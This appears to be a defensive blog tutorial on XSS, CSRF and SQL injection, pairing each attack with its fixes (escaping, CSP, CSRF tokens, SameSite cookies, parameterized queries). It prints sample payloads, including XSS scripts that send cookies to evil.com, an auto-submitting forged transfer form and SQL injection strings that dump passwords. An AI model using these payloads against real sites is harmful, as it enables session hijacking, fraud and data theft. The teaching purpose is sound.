---
title: 'Web Security Basics: Defending Against XSS, CSRF, and SQL Injection'
published: 2026-09-02
description: A practical guide to the three classic web vulnerabilities — XSS, CSRF, and SQL injection — covering how they work, how to defend against them, and runnable code examples with hardening checklists for each line of defense.
image: ''
tags: [Web Security, XSS, CSRF, SQL Injection, Internet]
category: Internet
draft: false
---
## Introduction: Why These Three Types of Vulnerabilities Are Still Happening Decades Later

According to the OWASP Top 10 list, which is updated every few years, Injection, Cross-Site Scripting (XSS), and Broken Access Control have always been steadfast "permanent residents." What they have in common is: **the principles are so simple that they can be demonstrated in three lines of code, yet eradicating them requires engineering discipline that runs through the entire development process**.

This article discusses these three types of vulnerabilities together, not to list knowledge, but because they share the same underlying logic: **never trust data from the client**. Whether it's rendered into HTML, concatenated into SQL, or carried as credentials across requests, as long as "user-controllable input" is treated as "trusted data," a vulnerability is planted.

## 1. XSS: Injecting Scripts into Someone Else's Page

The essence of XSS (Cross-Site Scripting) is: an attacker injects malicious scripts into a web page, causing them to execute when other users browse it. Based on the injection method, it is divided into three categories.

### 1. Reflected XSS

The server echoes request parameters back to the page as-is, without escaping. A typical scenario is a search box:

```html
<!-- 服务端模板，直接回显 q 参数 -->
<div>搜索结果：<?php echo $_GET['q']; ?></div>
```

The attacker constructs a link like this and sends it to the victim:

```
https://example.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

After the user clicks it, the script executes under the origin of `example.com`, directly reading and exfiltrating the Cookie. Because it's "request → immediate echo," it's called reflected.

### 2. Stored XSS

The malicious script is persisted to the database, and afterward every user who visits that page falls victim. A typical scenario is a message board or comment section:

```js
// 假设评论区直接把用户输入存入数据库，渲染时原样输出
function renderComment(comment) {
  // 危险！comment.text 可能包含 <script> 标签
  return `<div class="comment">${comment.text}</div>`;
}
```

The attacker posts a "comment" whose content is `<script>document.location='https://evil.com/?c='+document.cookie</script>`, and afterward everyone who browses that comment section will have the script executed. Stored XSS is far more harmful than reflected XSS, because it doesn't require "phishing" users one by one—a single comment can penetrate all visitors.

### 3. DOM-based XSS

This type of vulnerability doesn't go through the server; it happens purely on the browser side—JavaScript writes untrusted data into `innerHTML`, `document.write`, or `eval`:

```js
// 从 URL hash 读取并直接渲染，危险
const user = location.hash.slice(1);
document.getElementById('welcome').innerHTML = `欢迎，${user}`;
```

Visiting `https://example.com/#<img src=x onerror=alert(1)>` triggers the script. DOM-based XSS is particularly stealthy because it bypasses the server-side WAF—the malicious data never leaves the browser.

### Defending Against XSS

The core of defending against XSS is **"escape by context"**, and trying to ensure that data never becomes executable code:

```js
// 1. 输出到 HTML 文本时，转义关键字符
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// 2. 现代框架（React/Vue）默认转义文本插值，但危险 API 依然存在
//    不要这样做：
element.innerHTML = userInput;
//    而是用 textContent，它只当作纯文本处理：
element.textContent = userInput;
```

Plus two layers of defense in depth:

- **CSP (Content Security Policy)**: Restrict script sources via HTTP response headers, so that even if injected, scripts can't run.

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

- **Use whitelist filtering for rich text scenarios**: If users must be allowed to submit HTML (such as Markdown rendering), use a whitelist sanitization library like DOMPurify, rather than writing your own blacklist regex.

## 2. CSRF: Using Your Identity to Do Bad Things

CSRF (Cross-Site Request Forgery) doesn't steal your data; instead, it **exploits your already-logged-in state to make the browser send a request on your behalf that you are unaware of**. Its premise is: the browser will, by default, include the target site's Cookie.

### Attack Principle

Suppose the bank transfer endpoint looks like this:

```
POST https://bank.com/transfer
body: { to: 'attacker', amount: 10000 }
```

As long as the user is logged in to `bank.com` (Cookie is valid), the attacker places an auto-submitting form on their own website:

```html
<!-- 放在 evil.com 上的页面，用户一访问就自动提交 -->
<form action="https://bank.com/transfer" method="POST" style="display:none">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

When the user visits `evil.com`, the browser includes the Cookie for `bank.com` and sends a POST to `bank.com`—to the server, this is a "legitimate request from a logged-in user." **The essence of CSRF is: the browser cannot distinguish whether a request was actively initiated by the user or "smuggled in" by a third-party page.**

### Defending Against CSRF

Modern defenses mainly rely on three lines, which can be used in combination:

```js
// 1. CSRF Token：服务端生成随机 token，前端每次请求携带
// 攻击者无法读取这个 token（同源策略），所以伪造不了请求
// 服务端（伪代码）：
app.get('/form', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = token;
  res.render('form', { csrfToken: token });
});
app.post('/transfer', (req, res) => {
  if (req.body.csrfToken !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  // 校验通过才执行转账
});

// 2. SameSite Cookie：限制 Cookie 只在同站请求时携带
// Set-Cookie: sessionId=abc; SameSite=Lax  （或 Strict）
```

`SameSite=Lax` allows "top-level navigation" to carry Cookies (such as clicking into a website from search results), but blocks cross-site POST forms and `fetch` from carrying them, with almost no impact on normal usage—making it the least effort-intensive line of defense. Combined with validating the `Origin`/`Referer` headers, it can basically cover the vast majority of CSRF scenarios.

## 3. SQL Injection: The Cost of String Concatenation

SQL Injection is the representative of injection-type vulnerabilities: an attacker concatenates malicious SQL fragments into a query statement, thereby reading the database, modifying it, or even dumping it entirely.

### Attack Principle

The following code concatenates the username directly into the query:

```js
// 危险！直接拼接用户输入
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.query(query);
```

If the attacker enters the following in the username field:

```
' OR '1'='1' -- 
```

The concatenated SQL becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
```

The content after `--` is treated as a comment, `OR '1'='1'` is always true, so the attacker **can log in to any account without a password**. A more severe variant is union queries and stacked queries, which can directly read out an entire table:

```
' UNION SELECT username, password FROM users -- 
```

### Defending Against SQL Injection

There is an iron rule for defending against SQL injection: **never concatenate user input into SQL; always use parameterized queries (prepared statements)**.

```js
// 正确：参数化查询，用户输入永远被当作「数据」而非「代码」
const stmt = db.prepare(
  'SELECT * FROM users WHERE username = ? AND password = ?'
);
stmt.run(username, password);
```

The principle of parameterized queries is: the structure of the SQL statement is first parsed and compiled by the database, and parameters are merely "filled" into placeholders—no matter what is written in the parameters, it's impossible to change the syntactic structure of the SQL. For scenarios that cannot be parameterized (such as dynamically specifying column names or sort fields), use **whitelist** validation rather than escaping.

```js
// 动态排序字段：只允许白名单内的列名
const ALLOWED_COLUMNS = ['id', 'created_at', 'score'];
const orderBy = ALLOWED_COLUMNS.includes(req.query.sort)
  ? req.query.sort
  : 'id';
```

## Conclusion: The Same Sentence Behind All Three Lines of Defense

Looking at XSS, CSRF, and SQL injection together, you'll find that their defenses all point to the same principle:

| Vulnerability | What Was Trusted | Defense Method |
|------|-----------|---------|
| XSS | User input can safely become HTML | Escaping / textContent / CSP |
| CSRF | Requests with Cookies from the browser are all the user's intent | CSRF Token / SameSite / Origin validation |
| SQL Injection | User input can safely be concatenated into SQL | Parameterized queries / Whitelist |

Security is never a "feature," but an engineering habit that runs through everything. In daily development, you only need to remember three small things: **use textContent instead of innerHTML for rendering, add SameSite and CSRF Token for cross-site requests, and always use parameterized queries when querying the database**. Do these three things, and you've already blocked the vast majority of entry-level attack surfaces.

---
## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN — Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN — SameSite cookies explained](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value)
- [DOMPurify — DOM sanitization library](https://github.com/cure53/DOMPurify)